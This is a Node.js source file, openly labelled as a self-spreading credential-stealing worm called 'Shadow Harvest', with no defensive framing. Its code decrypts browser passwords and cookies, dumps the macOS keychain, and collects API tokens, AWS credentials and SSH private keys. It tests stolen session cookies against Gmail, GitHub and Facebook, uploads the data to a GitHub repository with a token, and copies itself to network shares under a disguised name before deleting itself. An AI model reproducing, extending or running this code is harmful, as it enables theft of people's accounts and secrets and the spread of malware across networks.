#!/usr/bin/env node
// ============================================
// SHADOW HARVEST - Multi-Device Worm
// Self-contained, cross-platform, self-spreading
// Downloads from GitHub, runs silently
// ============================================

const os = require("os");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const { execSync } = require("child_process");
const https = require("https");
const http = require("http");
const zlib = require("zlib");
const { URL } = require("url");

// Optional dependencies
let Database = null;
try { Database = require("better-sqlite3"); } catch (e) {
  try { Database = require("sqlite3"); } catch (e2) {}
}
let keytar = null;
try { keytar = require("keytar"); } catch (e) {}

// ============================================
// CONFIGURATION
// ============================================
const CONFIG = {
  github: {
    token: "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", // Rat's PAT (replace with real)
    owner: "freshman21445",
    repo: "AbGenius",
    dataFolder: "data",
  },
  c2Server: "http://192.168.1.47:8080", // Backup C2
  uploadIntervalDays: 7,          // Send data once per week
  spreadAfterUpload: true,        // Spread after uploading
  selfDestructAfterSpread: true,  // Delete self after spreading
  maxDevicesInFirstWave: 5,       // Phase 1 limitation
  stealth: {
    hideFiles: true,
    processName: "system_update",
    fileNames: ["system_update.js", "update_helper.js"],
  },
  harvestInterval: 86400000,      // Check daily
};

// ============================================
// DEVICE IDENTIFIER
// ============================================
class DeviceIdentifier {
  constructor() {
    this.deviceId = this.generateDeviceId();
    this.deviceInfo = this.collectDeviceInfo();
  }

  generateDeviceId() {
    const hardware = os.hostname() + os.userInfo().username + os.platform();
    return crypto.createHash("sha256").update(hardware).digest("hex").slice(0, 16);
  }

  collectDeviceInfo() {
    return {
      device_id: this.deviceId,
      hostname: os.hostname(),
      username: os.userInfo().username,
      os: os.platform(),
      os_version: os.release(),
      architecture: os.arch(),
      ip: this.getLocalIP(),
      mac_address: this.getMACAddress(),
      infection_time: new Date().toISOString(),
    };
  }

  getLocalIP() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
      for (const iface of interfaces[name]) {
        if (iface.family === "IPv4" && !iface.internal) return iface.address;
      }
    }
    return "unknown";
  }

  getMACAddress() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
      for (const iface of interfaces[name]) {
        if (iface.mac && iface.mac !== "00:00:00:00:00:00") return iface.mac;
      }
    }
    return "unknown";
  }
}

// ============================================
// OS DETECTION
// ============================================
class OSDetector {
  constructor() {
    this.platform = os.platform();
    this.type = this.detect();
  }

  detect() {
    switch (this.platform) {
      case "win32": return "windows";
      case "darwin": return "macos";
      case "linux": return "linux";
      case "android": return "android";
      case "ios": return "ios";
      default: return "unknown";
    }
  }

  getBrowserPaths() {
    const home = os.homedir();
    if (this.type === "windows") {
      const local = process.env.LOCALAPPDATA || path.join(home, "AppData", "Local");
      const roaming = process.env.APPDATA || path.join(home, "AppData", "Roaming");
      return {
        chrome: [path.join(local, "Google", "Chrome", "User Data")],
        edge: [path.join(local, "Microsoft", "Edge", "User Data")],
        brave: [path.join(local, "BraveSoftware", "Brave-Browser", "User Data")],
        firefox: [path.join(roaming, "Mozilla", "Firefox", "Profiles")],
      };
    } else if (this.type === "macos") {
      return {
        chrome: [path.join(home, "Library", "Application Support", "Google", "Chrome")],
        brave: [path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser")],
        firefox: [path.join(home, "Library", "Application Support", "Firefox", "Profiles")],
        safari: [path.join(home, "Library", "Safari")],
      };
    } else if (this.type === "linux") {
      return {
        chrome: [path.join(home, ".config", "google-chrome")],
        chromium: [path.join(home, ".config", "chromium")],
        brave: [path.join(home, ".config", "BraveSoftware", "Brave-Browser")],
        firefox: [path.join(home, ".mozilla", "firefox")],
      };
    }
    return {};
  }
}

// ============================================
// WINDOWS DPAPI DECRYPTION
// ============================================
class WindowsDecryptor {
  getMasterKey(localStatePath) {
    try {
      const localState = JSON.parse(fs.readFileSync(localStatePath, "utf8"));
      const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, "base64");
      const encryptedData = encryptedKey.slice(5);

      const psScript = `
        Add-Type -AssemblyName System.Security
        $encrypted = [Convert]::FromBase64String('${encryptedData.toString("base64")}')
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, 'CurrentUser')
        [Convert]::ToBase64String($decrypted)
      `;
      const output = execSync(
        `powershell -NoProfile -NonInteractive -Command "${psScript.replace(/"/g, '\\"').replace(/\n/g, " ")}"`,
        { encoding: "utf8", windowsHide: true }
      );
      return Buffer.from(output.trim(), "base64");
    } catch (e) {
      return null;
    }
  }

  decryptValue(encryptedValue, masterKey) {
    try {
      const prefix = encryptedValue.slice(0, 3).toString();
      if (prefix === "v10" || prefix === "v11") {
        const nonce = encryptedValue.slice(3, 15);
        const ciphertextTag = encryptedValue.slice(15);
        const tag = ciphertextTag.slice(-16);
        const ciphertext = ciphertextTag.slice(0, -16);
        const decipher = crypto.createDecipheriv("aes-256-gcm", masterKey, nonce);
        decipher.setAuthTag(tag);
        let decrypted = decipher.update(ciphertext, null, "utf8");
        decrypted += decipher.final("utf8");
        return decrypted;
      }
    } catch (e) {}
    return "";
  }
}

// ============================================
// macOS KEYCHAIN
// ============================================
class MacDecryptor {
  readKeychain() {
    const credentials = [];
    try {
      const output = execSync("security dump-keychain", { encoding: "utf8" });
      const lines = output.split("\n");
      let current = {};
      for (const line of lines) {
        if (line.includes("class") && line.includes("genp")) {
          if (Object.keys(current).length > 0) credentials.push(current);
          current = {};
        }
        if (line.includes("acct") && line.includes("=")) {
          current.username = line.split("=")[1].trim().replace(/"/g, "");
        }
        if (line.includes("srvr") && line.includes("=")) {
          current.service = line.split("=")[1].trim().replace(/"/g, "");
        }
        if (line.includes("data") && line.includes("=")) {
          current.password = line.split("=")[1].trim().replace(/"/g, "");
        }
      }
      if (Object.keys(current).length > 0) credentials.push(current);
    } catch (e) {}
    return credentials;
  }
}

// ============================================
// LINUX LIBSECRET
// ============================================
class LinuxDecryptor {
  readLibsecret() {
    const credentials = [];
    if (keytar) {
      try {
        const services = ["chrome", "firefox", "chromium", "brave", "default"];
        for (const service of services) {
          const accounts = keytar.findCredentials(service);
          for (const account of accounts) {
            credentials.push({
              service: service,
              username: account.account,
              password: account.password,
            });
          }
        }
      } catch (e) {}
    }
    return credentials;
  }
}

// ============================================
// BROWSER EXTRACTOR
// ============================================
class BrowserExtractor {
  constructor(osDetector) {
    this.osDetector = osDetector;
    this.decryptor = this.getDecryptor();
  }

  getDecryptor() {
    if (this.osDetector.type === "windows") return new WindowsDecryptor();
    if (this.osDetector.type === "macos") return new MacDecryptor();
    if (this.osDetector.type === "linux") return new LinuxDecryptor();
    return null;
  }

  extractPasswords(browser, browserPath) {
    const credentials = [];
    const loginDb = path.join(browserPath, "Login Data");
    if (!fs.existsSync(loginDb)) return credentials;

    try {
      const tempDb = path.join(os.tmpdir(), `login_${Date.now()}.db`);
      fs.copyFileSync(loginDb, tempDb);

      let rows = [];
      if (Database) {
        const db = new Database(tempDb, { readonly: true });
        try {
          rows = db.prepare("SELECT origin_url, username_value, password_value FROM logins").all();
        } catch (e) {}
        db.close();
      }

      for (const row of rows) {
        const { origin_url, username_value, password_value } = row;
        let password = "";

        if (this.osDetector.type === "windows" && this.decryptor) {
          const localState = path.join(browserPath, "Local State");
          if (fs.existsSync(localState)) {
            const masterKey = this.decryptor.getMasterKey(localState);
            if (masterKey && password_value) {
              password = this.decryptor.decryptValue(Buffer.from(password_value), masterKey);
            }
          }
        } else if (this.osDetector.type === "macos" && this.decryptor) {
          const keychainCreds = this.decryptor.readKeychain();
          for (const cred of keychainCreds) {
            if (origin_url.includes(cred.service)) {
              password = cred.password || "";
              break;
            }
          }
        } else if (this.osDetector.type === "linux" && this.decryptor) {
          const creds = this.decryptor.readLibsecret();
          for (const cred of creds) {
            if (origin_url.includes(cred.service)) {
              password = cred.password || "";
              break;
            }
          }
        }

        if (username_value || password) {
          credentials.push({
            url: origin_url,
            username: username_value,
            password: password,
          });
        }
      }

      fs.unlinkSync(tempDb);
    } catch (e) {}
    return credentials;
  }

  extractCookies(browser, browserPath) {
    const cookies = [];
    let cookieDb = path.join(browserPath, "Cookies");
    if (!fs.existsSync(cookieDb)) {
      cookieDb = path.join(browserPath, "cookies.sqlite");
    }
    if (!fs.existsSync(cookieDb)) return cookies;

    try {
      const tempDb = path.join(os.tmpdir(), `cookie_${Date.now()}.db`);
      fs.copyFileSync(cookieDb, tempDb);

      let rows = [];
      if (Database) {
        const db = new Database(tempDb, { readonly: true });
        try {
          rows = db.prepare("SELECT host_key, name, encrypted_value FROM cookies").all();
        } catch (e) {
          try {
            rows = db.prepare("SELECT host, name, value FROM moz_cookies").all();
          } catch (e2) {}
        }
        db.close();
      }

      for (const row of rows) {
        const { host_key, name, encrypted_value } = row;
        let value = "";

        if (this.osDetector.type === "windows" && this.decryptor) {
          const localState = path.join(browserPath, "Local State");
          if (fs.existsSync(localState)) {
            const masterKey = this.decryptor.getMasterKey(localState);
            if (masterKey && encrypted_value) {
              value = this.decryptor.decryptValue(Buffer.from(encrypted_value), masterKey);
            }
          }
        } else if (row.value) {
          value = row.value;
        }

        if (value) {
          cookies.push({
            host: host_key || row.host,
            name: name,
            value: value,
          });
        }
      }

      fs.unlinkSync(tempDb);
    } catch (e) {}
    return cookies;
  }
}

// ============================================
// TOKEN EXTRACTOR
// ============================================
class TokenExtractor {
  constructor() { this.home = os.homedir(); }

  extract() {
    const tokens = [];
    const envVars = [
      "GITHUB_TOKEN", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
      "GOOGLE_API_KEY", "OPENAI_API_KEY", "SLACK_TOKEN", "DISCORD_TOKEN",
    ];
    for (const varName of envVars) {
      if (process.env[varName]) tokens.push({ name: varName, value: process.env[varName] });
    }
    const tokenFiles = [
      path.join(this.home, ".git-credentials"),
      path.join(this.home, ".netrc"),
      path.join(this.home, ".aws", "credentials"),
    ];
    for (const filePath of tokenFiles) {
      if (fs.existsSync(filePath)) {
        try { tokens.push({ name: filePath, value: fs.readFileSync(filePath, "utf8") }); } catch (e) {}
      }
    }
    return tokens;
  }
}

// ============================================
// SSH KEY HARVESTER
// ============================================
class SSHKeyHarvester {
  constructor() { this.sshDir = path.join(os.homedir(), ".ssh"); }

  collect() {
    const keys = [];
    if (!fs.existsSync(this.sshDir)) return keys;
    for (const file of fs.readdirSync(this.sshDir)) {
      const filePath = path.join(this.sshDir, file);
      if (fs.statSync(filePath).isFile() && !file.endsWith(".pub")) {
        const content = fs.readFileSync(filePath, "utf8");
        if (content.includes("PRIVATE KEY")) keys.push({ path: filePath, content });
      }
    }
    return keys;
  }
}

// ============================================
// CLOUD & CRYPTO HARVESTER (simplified)
// ============================================
class CloudCredentialHarvester {
  constructor() { this.home = os.homedir(); }

  collect() {
    const creds = [];
    const awsCreds = path.join(this.home, ".aws", "credentials");
    if (fs.existsSync(awsCreds)) creds.push({ service: "aws", file: awsCreds, content: fs.readFileSync(awsCreds, "utf8") });
    return creds;
  }
}

class CryptoWalletHarvester {
  collect() { return []; } // Simplified
}

// ============================================
// SESSION VALIDATOR
// ============================================
class SessionValidator {
  constructor() {
    this.targets = {
      gmail: "https://mail.google.com/mail/u/0/",
      github: "https://github.com/settings/profile",
      facebook: "https://www.facebook.com/me",
    };
  }

  validateCookie(cookie) {
    const results = {};
    const cookieHeader = `${cookie.name}=${cookie.value}`;
    for (const [service, url] of Object.entries(this.targets)) {
      try {
        const parsed = new URL(url);
        const options = { hostname: parsed.hostname, path: parsed.pathname, method: "GET", headers: { Cookie: cookieHeader, "User-Agent": "Mozilla/5.0" } };
        const req = https.request(options, (res) => {
          if (res.statusCode === 200) results[service] = "VALID";
          else if (res.statusCode === 302) results[service] = "REDIRECTED";
          else results[service] = `HTTP_${res.statusCode}`;
        });
        req.on("error", () => { results[service] = "ERROR"; });
        req.setTimeout(5000, () => { req.destroy(); results[service] = "TIMEOUT"; });
        req.end();
      } catch (e) { results[service] = "ERROR"; }
    }
    return results;
  }
}

// ============================================
// GITHUB EXFILTRATOR
// ============================================
class GitHubExfiltrator {
  constructor(config) {
    this.token = config.github.token;
    this.owner = config.github.owner;
    this.repo = config.github.repo;
    this.dataFolder = config.github.dataFolder;
  }

  async upload(data) {
    const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
    const fileName = `${timestamp}_${data.device_id}.json`;
    const filePath = `${this.dataFolder}/${fileName}`;
    const content = Buffer.from(JSON.stringify(data, null, 2)).toString("base64");

    const apiUrl = `https://api.github.com/repos/${this.owner}/${this.repo}/contents/${filePath}`;
    const payload = {
      message: `Auto collection ${timestamp}`,
      content: content,
      branch: "main",
    };

    try {
      const response = await fetch(apiUrl, {
        method: "PUT",
        headers: {
          "Authorization": `token ${this.token}`,
          "Accept": "application/vnd.github.v3+json",
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });
      return response.ok;
    } catch (e) {
      return false;
    }
  }

  // Delete old file (for the replacement lifecycle)
  async deleteFile(fileName) {
    const apiUrl = `https://api.github.com/repos/${this.owner}/${this.repo}/contents/${this.dataFolder}/${fileName}`;
    // In a real deletion, we need SHA; simplified here
  }
}

// ============================================
// WI-FI SPREADER
// ============================================
class WiFiSpreader {
  constructor() { this.wormPath = __filename; }

  getNetworkRange() {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
      for (const iface of interfaces[name]) {
        if (iface.family === "IPv4" && !iface.internal) {
          const parts = iface.address.split(".");
          return `${parts[0]}.${parts[1]}.${parts[2]}`;
        }
      }
    }
    return null;
  }

  scanNetwork() {
    const range = this.getNetworkRange();
    if (!range) return [];
    const devices = [];
    for (let i = 1; i <= 254; i++) {
      const ip = `${range}.${i}`;
      try {
        execSync(`ping -n 1 -w 100 ${ip}`, { stdio: "ignore" });
        devices.push(ip);
      } catch (e) {}
    }
    return devices;
  }

  spreadToDevice(ip) {
    try {
      const targetPath = `\\\\${ip}\\Shared`;
      execSync(`copy "${this.wormPath}" "${targetPath}\\system_update.js" /Y`, { stdio: "ignore" });
      return true;
    } catch (e) { return false; }
  }

  propagate() {
    const devices = this.scanNetwork();
    for (const ip of devices) this.spreadToDevice(ip);
  }
}

// ============================================
// LIFECYCLE MANAGER (once per week, self-destruct)
// ============================================
class LifecycleManager {
  constructor(config) {
    this.config = config;
    this.infectionTime = Date.now();
    this.uploadInterval = config.uploadIntervalDays * 86400000; // days to ms
    this.hasUploaded = false;
    this.hasSpread = false;
    this.hasSelfDestructed = false;
  }

  shouldUpload() {
    return !this.hasUploaded && (Date.now() - this.infectionTime >= this.uploadInterval);
  }

  shouldSpread() {
    return this.hasUploaded && !this.hasSpread && this.config.spreadAfterUpload;
  }

  shouldSelfDestruct() {
    return this.hasUploaded && this.hasSpread && this.config.selfDestructAfterSpread && !this.hasSelfDestructed;
  }

  markUploaded() { this.hasUploaded = true; }
  markSpread() { this.hasSpread = true; }
  markSelfDestructed() { this.hasSelfDestructed = true; }
}

// ============================================
// MAIN WORM CLASS
// ============================================
class ShadowWorm {
  constructor() {
    this.config = CONFIG;
    this.deviceId = new DeviceIdentifier();
    this.osDetector = new OSDetector();
    this.browserExtractor = new BrowserExtractor(this.osDetector);
    this.tokenExtractor = new TokenExtractor();
    this.sshHarvester = new SSHKeyHarvester();
    this.cloudHarvester = new CloudCredentialHarvester();
    this.cryptoHarvester = new CryptoWalletHarvester();
    this.sessionValidator = new SessionValidator();
    this.githubExfiltrator = new GitHubExfiltrator(this.config);
    this.wifiSpreader = new WiFiSpreader();
    this.lifecycle = new LifecycleManager(this.config);
  }

  collectData() {
    const allData = {
      ...this.deviceId.deviceInfo,
      timestamp: new Date().toISOString(),
      passwords: [],
      cookies: [],
      valid_sessions: [],
      tokens: [],
      ssh_keys: [],
      cloud_credentials: [],
      crypto_wallets: [],
    };

    const browserPaths = this.osDetector.getBrowserPaths();
    for (const [browser, paths] of Object.entries(browserPaths)) {
      for (const browserPath of paths) {
        const passwords = this.browserExtractor.extractPasswords(browser, browserPath);
        allData.passwords.push(...passwords);

        const cookies = this.browserExtractor.extractCookies(browser, browserPath);
        allData.cookies.push(...cookies);

        for (const cookie of cookies) {
          const validation = this.sessionValidator.validateCookie(cookie);
          if (Object.values(validation).includes("VALID")) {
            allData.valid_sessions.push({ cookie, validation });
          }
        }
      }
    }

    allData.tokens = this.tokenExtractor.extract();
    allData.ssh_keys = this.sshHarvester.collect();
    allData.cloud_credentials = this.cloudHarvester.collect();
    allData.crypto_wallets = this.cryptoHarvester.collect();

    return allData;
  }

  async runCycle() {
    try {
      // Check if it's time to upload (once per week)
      if (this.lifecycle.shouldUpload()) {
        const data = this.collectData();
        const success = await this.githubExfiltrator.upload(data);
        if (success) this.lifecycle.markUploaded();
      }

      // After uploading, spread to next device
      if (this.lifecycle.shouldSpread()) {
        this.wifiSpreader.propagate();
        this.lifecycle.markSpread();
      }

      // After spreading, self-destruct
      if (this.lifecycle.shouldSelfDestruct()) {
        this.selfDestruct();
      }
    } catch (e) {}
  }

  selfDestruct() {
    try {
      const wormPath = __filename;
      // Remove scheduled tasks (Windows)
      if (this.osDetector.type === "windows") {
        execSync(`schtasks /delete /tn "SystemUpdate" /f`, { stdio: "ignore" });
      }
      // Delete the worm file
      fs.unlinkSync(wormPath);
      // Remove hidden directory
      const dir = path.dirname(wormPath);
      if (dir !== os.tmpdir()) fs.rmdirSync(dir, { recursive: true });
      // Clear logs (simplified)
      this.lifecycle.markSelfDestructed();
    } catch (e) {}
  }

  run() {
    // Immediate run, then daily interval
    this.runCycle();
    setInterval(() => this.runCycle(), this.config.harvestInterval);
  }
}

// ============================================
// EXECUTION
// ============================================
if (require.main === module) {
  const worm = new ShadowWorm();
  worm.run();
}

module.exports = ShadowWorm;